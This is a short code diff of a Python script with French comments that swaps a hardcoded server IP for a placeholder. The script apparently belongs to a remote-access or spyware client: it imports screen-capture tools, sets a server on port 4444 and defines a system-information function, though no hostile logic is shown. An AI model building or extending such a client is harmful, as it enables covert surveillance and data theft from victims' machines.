@@ -7,7 +7,7 @@ from PIL import Image, ImageGrab
 from io import BytesIO
 
 # Configuration du serveur codée en dur
-SERVER_HOST = "192.168.1.100"  # Remplacez par l'adresse IP de votre serveur
+SERVER_HOST = "ip"  # Remplacez par l'adresse IP de votre serveur
 SERVER_PORT = 4444
 
 def get_sysinfo():
